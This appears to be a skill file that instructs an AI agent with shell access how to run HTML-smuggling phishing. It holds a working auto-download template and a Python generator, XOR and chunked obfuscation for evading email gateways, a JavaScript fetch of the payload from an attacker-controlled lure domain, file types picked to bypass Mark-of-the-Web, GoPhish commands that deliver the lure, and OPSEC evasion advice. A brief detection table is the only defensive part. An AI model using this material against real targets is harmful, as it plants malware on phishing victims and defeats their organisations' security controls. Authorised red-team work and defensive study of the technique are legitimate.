---
name: html-smuggling-lure
description: "HTML smuggling payloads for initial access — embed base64-encoded binaries inside an HTML attachment that reconstructs and auto-downloads the file client-side via JavaScript Blob, bypassing email gateway and proxy file-type inspection."
allowed-tools: Bash Read Write
metadata:
  subdomain: phishing
  when_to_use: "html smuggling blob javascript base64 iso zip msi initial access email attachment bypass gateway proxy file download t1027.006"
  mitre_attack:
    - T1027.006
    - T1566.001
    - T1204.002
  tags:
    - phishing
    - html-smuggling
    - initial-access
    - evasion
---

# HTML Smuggling Lure

HTML smuggling abuses the browser's ability to construct files from
JavaScript — a base64-encoded payload is embedded directly in an HTML
email attachment or link. When opened, JavaScript decodes the blob,
creates an `<a>` element with a `blob:` URL, and triggers a download.
The payload never transits the wire as a detectable file type, so email
gateways and web proxies that inspect MIME types see only `text/html`.

Nobelium (SolarWinds), Qakbot, and IcedID campaigns have used this
technique extensively since 2021.

## Prerequisites

- A compiled payload (ISO, ZIP, MSI, IMG, or VHD) ready for delivery.
- GoPhish or direct SMTP for delivery (`gophish-campaign`).
- The `lure-deconfliction` handshake COMPLETE.

## Quick Reference

```bash
# Encode payload to base64
base64 -w0 /workspace/payload.iso > /workspace/payload.b64

# Generate the HTML smuggling page
python3 /workspace/gen_smuggle.py \
  --payload /workspace/payload.b64 \
  --filename "Report.iso" \
  --mimetype "application/octet-stream" \
  --output /workspace/smuggle.html

# Deliver via GoPhish as an attachment
curl -sk -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H 'Content-Type: application/json' \
  "$GOPHISH_API/templates/" -d @/workspace/smuggle_template.json
```

## MITRE ATT&CK Mapping

| Technique | ID | Usage |
|---|---|---|
| Obfuscated Files: HTML Smuggling | T1027.006 | Payload reconstructed client-side from JS blob |
| Phishing: Spearphishing Attachment | T1566.001 | HTML file delivered as email attachment |
| User Execution: Malicious File | T1204.002 | Victim opens HTML, browser downloads payload |

## 1. Basic HTML Smuggling Template

Minimal self-contained HTML that decodes a base64 payload and triggers
download:

```html
<!DOCTYPE html>
<html>
<head><title>Secure Document</title></head>
<body>
<p>Your document is downloading...</p>
<script>
// Base64 payload — replace with actual encoded content
var b64 = "<BASE64_PAYLOAD>";
var fname = "<FILENAME>";    // e.g. "Report.iso"
var mtype = "application/octet-stream";

var bytes = atob(b64);
var arr = new Uint8Array(bytes.length);
for (var i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);

var blob = new Blob([arr], {type: mtype});
var a = document.createElement("a");
a.href = URL.createObjectURL(blob);
a.download = fname;
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
URL.revokeObjectURL(a.href);
</script>
</body>
</html>
```

## 2. Generator Script

Automate HTML smuggling page creation with theming:

```python
import base64
import sys

TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
<title>{title}</title>
<style>
body {{ font-family: Segoe UI, sans-serif; display: flex;
  justify-content: center; align-items: center; height: 100vh;
  background: #f5f5f5; }}
.card {{ background: #fff; padding: 40px; border-radius: 4px;
  box-shadow: 0 2px 8px rgba(0,0,0,.15); text-align: center; }}
.spinner {{ border: 4px solid #eee; border-top: 4px solid #0078d4;
  border-radius: 50%; width: 40px; height: 40px;
  animation: spin 1s linear infinite; margin: 20px auto; }}
@keyframes spin {{ to {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
<div class="card">
  <h2>Opening Secure Document</h2>
  <div class="spinner"></div>
  <p>If the download does not start, <a id="dl" href="#">click here</a>.</p>
</div>
<script>
(function() {{
  var d = "{b64data}";
  var n = "{filename}";
  var b = atob(d);
  var u = new Uint8Array(b.length);
  for (var i = 0; i < b.length; i++) u[i] = b.charCodeAt(i);
  var bl = new Blob([u], {{type: "application/octet-stream"}});
  var url = URL.createObjectURL(bl);
  var a = document.getElementById("dl");
  a.href = url; a.download = n;
  var t = document.createElement("a");
  t.href = url; t.download = n;
  document.body.appendChild(t); t.click();
  document.body.removeChild(t);
}})();
</script>
</body>
</html>'''

def generate(payload_path, filename, title, output):
    with open(payload_path, "rb") as f:
        b64 = base64.b64encode(f.read()).decode()
    html = TEMPLATE.format(
        title=title, b64data=b64,
        filename=filename)
    with open(output, "w") as f:
        f.write(html)
    print(f"[+] Smuggle page written to {output} ({len(b64)} bytes encoded)")

# Usage: generate("/workspace/payload.iso", "Report.iso",
#                 "Secure Document Portal", "/workspace/smuggle.html")
```

## 3. Obfuscation Layers

Basic base64 is trivially detected by static analysis. Layer
obfuscation to evade email gateway JavaScript scanners:

### 3a. XOR + base64

```javascript
// Encode: XOR each byte with key, then base64
function xorEncode(data, key) {
  var out = new Uint8Array(data.length);
  for (var i = 0; i < data.length; i++)
    out[i] = data[i] ^ key.charCodeAt(i % key.length);
  return btoa(String.fromCharCode.apply(null, out));
}

// Decode at runtime
function xorDecode(b64, key) {
  var raw = atob(b64);
  var out = new Uint8Array(raw.length);
  for (var i = 0; i < raw.length; i++)
    out[i] = raw.charCodeAt(i) ^ key.charCodeAt(i % key.length);
  return out;
}
```

### 3b. Chunked Reassembly

Split the base64 into multiple JS string variables concatenated at
runtime — defeats pattern-matching on large contiguous base64:

```javascript
var p1 = "AAAA..."; // chunk 1
var p2 = "BBBB..."; // chunk 2
var p3 = "CCCC..."; // chunk 3
var full = atob(p1 + p2 + p3);
```

### 3c. Fetch from External URL

Instead of embedding the full blob, fetch it at runtime from an
attacker-controlled server — the HTML itself is tiny and clean:

```javascript
fetch("https://cdn.<LURE_DOMAIN>/doc/" + docId)
  .then(r => r.blob())
  .then(b => {
    var a = document.createElement("a");
    a.href = URL.createObjectURL(b);
    a.download = "Report.iso";
    a.click();
  });
```

## 4. Payload File Type Selection

| File Type | Extension | Bypass | Notes |
|---|---|---|---|
| ISO / IMG | `.iso` | Mark-of-the-Web bypass (pre-Win11 22H2) | Auto-mounts as virtual drive |
| ZIP | `.zip` | Universally accepted | May be scanned; password-protect |
| MSI | `.msi` | Signed MSI bypasses AppLocker default rules | Requires valid or stolen signature |
| VHD / VHDX | `.vhd` | MOTW bypass, auto-mounts on double-click | Less commonly blocked |
| LNK inside ZIP | `.zip` → `.lnk` | LNK executes arbitrary commands | Windows only |

## 5. Delivery via GoPhish

```bash
# Encode the HTML smuggling page for GoPhish attachment
B64HTML=$(base64 -w0 /workspace/smuggle.html)

curl -sk -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H 'Content-Type: application/json' \
  "$GOPHISH_API/templates/" -d "{
    \"name\": \"secure-doc-delivery\",
    \"subject\": \"Secure document from <SENDER_NAME>\",
    \"html\": \"<p>Hi {{.FirstName}},</p><p>Please open the attached secure document.</p><p style='color:#999;font-size:10px'>{{.Tracker}}</p>\",
    \"attachments\": [{
      \"name\": \"SecureDoc.html\",
      \"content\": \"$B64HTML\",
      \"type\": \"text/html\"
    }]
  }"
```

## OPSEC

- **HTML file name**: use business-relevant names (`SecureMessage.html`,
  `Invoice_<NUM>.html`). Avoid `payload.html`.
- **No `text/html` block rules**: most orgs allow HTML attachments
  (receipts, newsletters). Verify target policy first.
- **Payload size**: base64 inflates by ~33%. Keep raw payloads <5 MB
  so the HTML stays under common attachment size limits (10-25 MB).
- **Browser compatibility**: `Blob` + `createObjectURL` works in all
  modern browsers. Test in Edge (corporate default).
- Strip all development comments and source maps from production HTML.

## Tools & Resources

| Tool | Purpose |
|---|---|
| Python `base64` | Payload encoding |
| GoPhish | Campaign delivery and tracking |
| `msfvenom` | Payload generation (MSI, EXE, DLL) |
| `mkisofs` / `genisoimage` | ISO image creation |
| `qemu-img` | VHD/VHDX creation |

## Detection Signatures

| Detection | Source | Description |
|---|---|---|
| HTML attachment with `Blob` / `createObjectURL` | Email gateway JS analysis | Static scan for smuggling patterns |
| Large base64 string in HTML | Content inspection | Entropy analysis on HTML attachments |
| `atob()` + `Uint8Array` pattern | YARA / Sigma | Known smuggling JS idiom |
| ISO/VHD download from `blob:` URL | EDR (browser child process) | File materialised from browser without network fetch |

## Error Handling & Edge Cases

- **Browser blocks download**: Chrome may block `blob:` downloads from
  file:// context. Deliver as email attachment (opened via webmail) or
  host on the lure domain.
- **Email gateway strips HTML attachments**: fallback to a link pointing
  at the HTML smuggling page hosted on the lure domain.
- **Mark-of-the-Web on ISO**: Windows 11 22H2+ propagates MOTW into
  ISO contents. Switch to password-protected ZIP or VHD.
- **Large payload truncation**: if the HTML exceeds the email size
  limit, use the external-fetch variant (§3c).

## Decision Gate

```
IF target email gateway performs JavaScript analysis on HTML attachments
  → use external-fetch variant (§3c) with clean HTML
  → OR deliver via hosted link instead of attachment
ELIF target enforces MOTW on ISO files (Win11 22H2+)
  → use password-protected ZIP or VHD as payload container
ELIF payload is >5 MB
  → use external-fetch variant to keep HTML attachment small
ELIF engagement requires offline delivery (no C2 callback during download)
  → embed full payload inline with XOR obfuscation (§3a)
ELSE
  → standard inline base64 smuggling with chunked reassembly (§3b)
```

## Evidence

Delivery confirmation from GoPhish → link to `User` node.
If the smuggled payload calls back, record the initial-access vector as
`html-smuggling` in the kill-chain node. Save the HTML template hash
under `evidence/phisher/<campaign>-smuggle.json`.
